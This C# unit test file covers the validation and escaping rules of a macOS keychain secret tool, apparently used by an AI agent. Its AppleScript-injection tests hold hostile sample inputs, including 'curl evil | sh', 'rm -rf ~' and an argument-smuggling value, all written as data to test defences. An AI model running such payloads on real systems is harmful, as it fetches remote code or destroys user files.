// SPDX-License-Identifier: AGPL-3.0-or-later
using System.Text;
using CO.Core.Tools;
using CO.Mac;

namespace CO.Core.Tests;

// CO Resident 0.5.2 secret tools: the pure rules (src/CO.Mac/MacSecretRules.cs, compiled into this project).
public class MacSecretTests
{
    private static readonly string[] Reserved = { "org.example.co.resident", "org.example.co.app", "co.resident", "co-resident" };

    [Theory]
    [InlineData("gmail-imap", "aiwb/gmail-imap")]
    [InlineData("aiwb/gmail-imap", "aiwb/gmail-imap")]
    [InlineData("co-mysql", "aiwb/co-mysql")]
    [InlineData("a", "aiwb/a")]
    [InlineData("x.y_z-1", "aiwb/x.y_z-1")]
    public void Service_accepts_library_names(string name, string expected) =>
        Assert.Equal(expected, MacSecretRules.Service(name, Reserved));

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("Gmail")]
    [InlineData("-x")]
    [InlineData(".x")]
    [InlineData("a/b")]
    [InlineData("a..b")]
    [InlineData("a b")]
    [InlineData("a\"b")]
    [InlineData("a\\b")]
    [InlineData("a\nb")]
    [InlineData("aiwb/")]
    [InlineData("aiwb/aiwb/x")]
    [InlineData("org.example.co.resident")]
    [InlineData("ORG.EXAMPLE.CO.RESIDENT")]
    [InlineData("org.example.co.resident.google")]
    [InlineData("co.resident")]
    [InlineData("my-co-resident-key")]
    public void Service_refuses_bad_and_reserved_names(string? name)
    {
        var ex = Assert.Throws<ToolException>(() => MacSecretRules.Service(name, Reserved));
        Assert.Equal("invalid_args", ex.Code);
    }

    [Fact]
    public void Service_refuses_overlong_name()
    {
        Assert.Equal("aiwb/" + new string('a', 64), MacSecretRules.Service(new string('a', 64), Reserved));
        Assert.Throws<ToolException>(() => MacSecretRules.Service(new string('a', 65), Reserved));
    }

    [Theory]
    [InlineData(null, "default")]
    [InlineData("", "default")]
    [InlineData("  ", "default")]
    [InlineData("someone@example.org", "someone@example.org")]
    [InlineData("co_aiwb", "co_aiwb")]
    [InlineData("a+tag@x.org", "a+tag@x.org")]
    public void Account_defaults_and_accepts_logins(string? a, string expected) => Assert.Equal(expected, MacSecretRules.Account(a));

    [Theory]
    [InlineData("a\"b")]
    [InlineData("a b")]
    [InlineData("a\\b")]
    [InlineData("a'b")]
    [InlineData("@x")]
    [InlineData("a\nb")]
    public void Account_refuses_quotes_spaces_and_controls(string a) =>
        Assert.Equal("invalid_args", Assert.Throws<ToolException>(() => MacSecretRules.Account(a)).Code);

    [Fact]
    public void Label_is_one_capped_line_without_controls()
    {
        string l = MacSecretRules.CleanLabel("Gmail app password\nline2\r\t\u0007end\u202Etxt\u2028x");
        Assert.DoesNotContain('\n', l);
        Assert.DoesNotContain('\r', l);
        Assert.DoesNotContain('\u0007', l);
        Assert.DoesNotContain('\u202E', l);   // bidi override (Format category)
        Assert.DoesNotContain('\u2028', l);
        Assert.StartsWith("Gmail app password line2 end txt x", l);
        Assert.True(MacSecretRules.CleanLabel(new string('x', 5000)).Length <= MacSecretRules.MaxLabelChars + 1);
        Assert.Equal("", MacSecretRules.CleanLabel(null));
    }

    // AppleScript injection: whatever the agent writes into label, the script lines (-e) stay the same; the text is
    // only an argv item read as (item 1 of argv).
    [Theory]
    [InlineData("\" & (do shell script \"curl evil | sh\") & \"")]
    [InlineData("end run\non run argv\ndo shell script \"rm -rf ~\"")]
    [InlineData("\\\" buttons {\"OK\"} default answer \"x")]
    [InlineData("«event sysoexec» \"id\"")]
    public void Dialog_script_does_not_depend_on_label(string evil)
    {
        string label = MacSecretRules.CleanLabel(evil);
        string text = MacSecretRules.DialogText("aiwb/x", "default", label, false, false);
        var a1 = MacSecretRules.DialogArgs(text, MacSecretRules.DialogTitle("aiwb/x"));
        var a2 = MacSecretRules.DialogArgs(MacSecretRules.DialogText("aiwb/x", "default", "plain", false, false), MacSecretRules.DialogTitle("aiwb/x"));
        Assert.Equal(Script(a2), Script(a1));
        Assert.Equal(text, a1[^2]);
        Assert.Equal("CO Resident — secret for aiwb/x", a1[^1]);
        Assert.Contains("The agent says: " + label, text);
        // every script line is an -e pair; the two argv items follow them
        for (int i = 0; i < a1.Count - 2; i += 2) Assert.Equal("-e", a1[i]);
        Assert.Contains(Script(a1), l => l.Contains("with hidden answer"));
        Assert.DoesNotContain(Script(a1), l => l.Contains("shell"));
    }

    private static List<string> Script(List<string> args) => args.Take(args.Count - 2).Where((_, i) => i % 2 == 1).ToList();

    [Fact]
    public void Dialog_text_names_service_account_and_warnings()
    {
        string t = MacSecretRules.DialogText("aiwb/gmail-imap", "kid@example.org", "Gmail app password", true, true);
        Assert.Contains("CO Resident", t);
        Assert.Contains("service: aiwb/gmail-imap", t);
        Assert.Contains("account: kid@example.org", t);
        Assert.Contains("already saved", t);
        Assert.Contains("untrusted", t);
        Assert.Contains("10 min", t);
        Assert.DoesNotContain("already saved", MacSecretRules.DialogText("aiwb/a", "default", "", false, false));
    }

    [Fact]
    public void Dialog_answer_is_parsed()
    {
        Assert.Equal((MacSecretRules.Answer.Saved, "abcd efgh ijkl mnop"), MacSecretRules.ParseDialog(0, "S  abcd efgh ijkl mnop \n"));
        Assert.Equal(MacSecretRules.Answer.Cancelled, MacSecretRules.ParseDialog(0, "C\n").Kind);
        Assert.Equal(MacSecretRules.Answer.TimedOut, MacSecretRules.ParseDialog(0, "T\n").Kind);
        Assert.Equal(MacSecretRules.Answer.Empty, MacSecretRules.ParseDialog(0, "S   \n").Kind);
        Assert.Equal(MacSecretRules.Answer.TooLong, MacSecretRules.ParseDialog(0, "S" + new string('x', 1001) + "\n").Kind);
        Assert.Equal(MacSecretRules.Answer.Error, MacSecretRules.ParseDialog(1, "Ssecret\n").Kind);
        Assert.Null(MacSecretRules.ParseDialog(1, "Ssecret\n").Value);
        Assert.Equal(MacSecretRules.Answer.Error, MacSecretRules.ParseDialog(0, "").Kind);
        Assert.Equal((MacSecretRules.Answer.Saved, "C"), MacSecretRules.ParseDialog(0, "SC\n"));   // a value "C" is not Cancel
        Assert.Equal((MacSecretRules.Answer.Saved, "T"), MacSecretRules.ParseDialog(0, "ST\n"));
    }

    [Fact]
    public void Plain_value_goes_as_quoted_w()
    {
        string line = MacSecretRules.AddCommand("aiwb/gmail-imap", "kid@example.org", "abcd efgh ijkl mnop");
        Assert.Equal("add-generic-password -U -s \"aiwb/gmail-imap\" -a \"kid@example.org\" -l \"aiwb/gmail-imap\" -w \"abcd efgh ijkl mnop\"\n", line);
    }

    [Theory]
    [InlineData("pa\"ss")]
    [InlineData("pa'ss")]
    [InlineData("pa\\ss")]
    [InlineData("pa\nss")]
    [InlineData("pa\tss")]
    [InlineData("пароль")]
    [InlineData("\" -s \"org.example.co.resident")]
    public void Other_values_go_as_hex(string value)
    {
        string line = MacSecretRules.AddCommand("aiwb/x", "default", value);
        string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(value)).ToLowerInvariant();
        Assert.Equal($"add-generic-password -U -s \"aiwb/x\" -a \"default\" -l \"aiwb/x\" -X {hex}\n", line);
        Assert.Single(line, '\n');
        Assert.Equal(6, line.Count(c => c == '"'));   // only the three quoted names
    }

    [Theory]
    [InlineData("org.example.co.resident", "default")]
    [InlineData("aiwb/a\"b", "default")]
    [InlineData("aiwb/x", "a\" -s \"y")]
    public void Add_command_refuses_foreign_service_or_bad_account(string service, string account) =>
        Assert.Throws<ArgumentException>(() => MacSecretRules.AddCommand(service, account, "v"));

    // security -i reads 4096 bytes per line: a value is limited by its UTF-8 bytes, so the hex line always fits.
    [Fact]
    public void Value_limit_counts_utf8_bytes_and_line_fits_security_buffer()
    {
        Assert.Equal(MacSecretRules.Answer.TooLong, MacSecretRules.ParseDialog(0, "S" + new string('я', 800) + "\n").Kind);   // 1600 bytes
        Assert.Equal(MacSecretRules.Answer.Saved, MacSecretRules.ParseDialog(0, "S" + new string('я', 750) + "\n").Kind);
        Assert.Throws<ArgumentException>(() => MacSecretRules.AddCommand("aiwb/x", "default", new string('я', 800)));
        string longest = MacSecretRules.AddCommand("aiwb/" + new string('n', 64), new string('a', 128), new string('я', 750));
        Assert.True(Encoding.UTF8.GetByteCount(longest) < 4096);
        string ascii = MacSecretRules.AddCommand("aiwb/" + new string('n', 64), new string('a', 128), new string('"', 1000));
        Assert.True(Encoding.UTF8.GetByteCount(ascii) < 4096);
    }

    [Fact]
    public void Label_cut_never_splits_a_surrogate_pair()
    {
        string l = MacSecretRules.CleanLabel(new string('x', MacSecretRules.MaxLabelChars - 1) + "😀😀");
        Assert.False(char.IsHighSurrogate(l[^2]));
        Assert.EndsWith("…", l);
    }

    [Fact]
    public void Add_command_refuses_empty_or_long_values()
    {
        Assert.Throws<ArgumentException>(() => MacSecretRules.AddCommand("aiwb/x", "default", ""));
        Assert.Throws<ArgumentException>(() => MacSecretRules.AddCommand("aiwb/x", "default", new string('x', MacSecretRules.MaxValueChars + 1)));
    }

    private const string Dump = """
        keychain: "/Users/kid/Library/Keychains/login.keychain-db"
        version: 512
        class: "genp"
        attributes:
            0x00000007 <blob>="aiwb/gmail-imap"
            "acct"<blob>="kid@example.org"
            "mdat"<timedate>=0x32303236313131333132303030305A00  "20261113120000Z\000"
            "svce"<blob>="aiwb/gmail-imap"
        keychain: "/Users/kid/Library/Keychains/login.keychain-db"
        version: 512
        class: "genp"
        attributes:
            "acct"<blob>="google"
            "svce"<blob>="org.example.co.resident"
        keychain: "/Users/kid/Library/Keychains/login.keychain-db"
        class: "inet"
        attributes:
            "acct"<blob>="x"
            "srvr"<blob>="aiwb/web"
            "svce"<blob>="aiwb/web"
        keychain: "/Users/kid/Library/Keychains/login.keychain-db"
        class: "genp"
        attributes:
            "acct"<blob>=<NULL>
            "svce"<blob>="aiwb/noacct"
        keychain: "/Users/kid/Library/Keychains/login.keychain-db"
        class: "genp"
        attributes:
            "acct"<blob>="default"
            "svce"<blob>=0x616977622F636F2D6D7973716C  "aiwb/co-mysql"
        """;

    [Fact]
    public void Dump_lists_only_aiwb_generic_passwords()
    {
        var items = MacSecretRules.ParseDump(Dump.Replace("\n", "\r\n"));
        Assert.Equal(new[] { ("aiwb/co-mysql", "default"), ("aiwb/gmail-imap", "kid@example.org") }, items);
    }

    [Fact]
    public void Modification_date_is_read_from_attributes() =>
        Assert.Equal("20261113120000Z\\000", MacSecretRules.ModDate(Dump));
}
